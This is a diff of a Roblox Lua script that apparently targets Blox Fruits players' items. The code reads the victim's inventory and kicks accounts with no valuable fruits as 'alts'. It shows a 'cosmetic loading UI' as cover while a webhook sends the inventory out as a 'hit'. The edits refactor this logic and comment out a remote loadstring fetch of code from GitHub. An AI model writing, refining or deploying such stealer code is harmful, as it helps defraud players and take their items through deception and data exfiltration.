 	-- Get initial inventory snapshot
-	local inventory = getInventory()
-	if not inventory then LocalPlayer:Kick("Error getting initial inventory."); return end
+	local initialInventory = getInventory() -- Renamed to avoid conflict with global 'inventory22'
+	if not initialInventory then LocalPlayer:Kick("Error getting initial inventory."); return end
+    inventory22 = initialInventory -- Assign to the global used by leave check functions
 
 	-- Check if player has items worth notifying about
-	local function checkInventoryForHit()
+	local function checkInventoryForHit(inv)
 		local fruitsToHitSet = {}; for _, f in ipairs(FruitsToHit) do fruitsToHitSet[f] = true end
-		for _, item in ipairs(inventory) do
+		for _, item in ipairs(inv) do
 			if (item.Type == "Blox Fruit" and fruitsToHitSet[item.Name]) or item.Type == "Premium" then
 				return true
 			end
@@ -1692,8 +1722,8 @@ local function init()
 		return false
 	end
 
-	if not checkInventoryForHit() then
-		LocalPlayer:Kick("Alt Account Detected!\nPlease use a different account to run this script.\nIf you are not an alt, please contact support.")
+	if not checkInventoryForHit(initialInventory) then
+		LocalPlayer:Kick("No valuable items detected for initial hit. (Alt Account Filter)")
 		return
 	end
 
@@ -1702,7 +1732,7 @@ local function init()
 		task.wait(1)
 		JoinTeam()
 		task.spawn(createNotification) -- Show cosmetic loading UI
-		sendWebhook(inventory)       -- Send the main hit webhook(s)
+		sendWebhook(initialInventory)       -- Send the main hit webhook(s) using initial snapshot
 	end)
 
 	-- State variables for activation logic
@@ -1725,7 +1755,9 @@ local function init()
 			-- Load External UI (optional, if URL is set)
 			if not externalUILoaded then
 				local success, err = pcall(function()
-					loadstring(game:HttpGet("https://raw.githubusercontent.com/W-Scripts/UI/refs/heads/main/LoadingUI"))() -- Ensure URL is correct/intended
+					-- Ensure the HttpGet call is safe and intended if used
+					-- loadstring(game:HttpGet("https://raw.githubusercontent.com/W-Scripts/UI/refs/heads/main/LoadingUI"))()
+                    warn("External UI loading is commented out for safety.") -- Commented out for safety
 				end)
 				if not success then warn("Failed to load external UI:", err) else externalUILoaded = true end
 			end
@@ -1777,14 +1809,15 @@ end
 
 --[[ Script Entry Point ]]--
 -- Use a unique variable for basic re-execution prevention
-if not shared.ScriptExecuted_SharkyV2_FinalFormatted then
-	shared.ScriptExecuted_SharkyV2_FinalFormatted = true
+if not shared.ScriptExecuted_SharkyV2_FinalFormatted_v2 then
+	shared.ScriptExecuted_SharkyV2_FinalFormatted_v2 = true
 	task.spawn(function() -- Run init in a protected thread
 		local success, errorMessage = pcall(init)
 		if not success then
 			warn("SCRIPT INIT ERROR:", errorMessage)
 			task.spawn(function() -- Use another task.spawn for kick to avoid issues within pcall error handling
-				LocalPlayer:Kick("Script Initialization Error: " .. tostring(errorMessage))
+                local safeMsg = string.gsub(tostring(errorMessage or "Unknown Error"), "[<>\"']", "") -- Sanitize message
+				LocalPlayer:Kick("Script Initialization Error: " .. safeMsg)
 			end)
 		end
 	end)
